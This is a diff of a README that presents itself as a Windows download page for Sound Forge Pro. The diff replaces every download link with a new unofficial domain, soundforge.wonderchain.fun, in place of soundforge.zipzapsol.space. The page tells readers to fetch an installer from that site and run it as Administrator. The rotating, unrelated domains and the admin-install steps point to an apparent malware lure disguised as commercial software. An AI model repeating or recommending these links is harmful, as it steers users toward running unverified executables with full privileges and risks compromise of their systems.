@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Sound Forge Pro** for Windows.
 
 <p align="center">
-  <a href="https://soundforge.zipzapsol.space/">
+  <a href="https://soundforge.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Sound%20Forge%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Sound Forge Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[soundforge.zipzapsol.space](https://soundforge.zipzapsol.space/)** |
-| **Full URL** | `https://soundforge.zipzapsol.space/` |
+| **Direct link** | **[soundforge.wonderchain.fun](https://soundforge.wonderchain.fun/)** |
+| **Full URL** | `https://soundforge.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — soundforge.zipzapsol.space](https://soundforge.zipzapsol.space/)** (link above)
+1. Click **[Download — soundforge.wonderchain.fun](https://soundforge.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://soundforge.zipzapsol.space/"><strong>⬇ Download Sound Forge Pro now</strong></a></p>
+<p align="center"><a href="https://soundforge.wonderchain.fun/"><strong>⬇ Download Sound Forge Pro now</strong></a></p>
 
 ---
 
